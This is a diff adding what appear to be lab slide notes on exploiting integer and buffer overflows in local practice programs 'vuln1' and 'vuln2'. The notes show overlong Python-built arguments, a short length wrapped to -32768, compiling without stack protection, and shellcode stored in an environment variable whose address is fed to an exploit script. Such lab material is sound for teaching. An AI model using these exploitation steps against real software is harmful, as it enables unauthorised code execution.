@@ -1,0 +1,54 @@
+./vuln1 $(python -c 'print "10 "+"A"*10')
+s = 10
+buffer: AAAAAAAAA
+
+./vuln1 $(python -c 'print "81 "+"A"*81')
+s = 81
+Oh no you don't!
+
+
+./vuln1 $(python -c 'print "65540 "+"A"*400')
+Output: s = 4
+Segmentation fault (core dumped)
+
+< Compile the program using flags
+-fno-stack-protect, execstack and ggdb >
+
+
+Vulnerable Prog2 (Exploiting Integer Overflow)
+
+Exploiting the variable short arglen
+○
+●
+Range of short data type : -32768 to 32767
+Using a python program for exploitation
+bug@ubuntu:~/Intgr_Ovrflw$ ./vuln2 $(python exploit2.py)
+The string length: 32768
+exploit2.py
+length=-32768                    fstPad=32768
+copy successful                  print fstPad*"A"
+Segmentation fault (core dumped)
+
+
+
+Vulnerable Prog2 (Exploiting both Integer and Buffer
+Overflow)
+
+Create environment variable MYSHELL for storing
+shellcode
+
+$ export MYSHELL=`python shellcode.py`
+
+Find the address of the MYSHELL environment variable
+$ gcc -o get_env_addrs get_env_addrs.c
+$ ./get_env_addrs
+
+
+Vulnerable Prog2 (Exploiting both Integer and Buffer
+Overflow)
+Put the address in exploit2.py
+
+Exploit the vulnerable program vuln2.c
+$ ./vuln2 $(python exploit2.py)
+
+
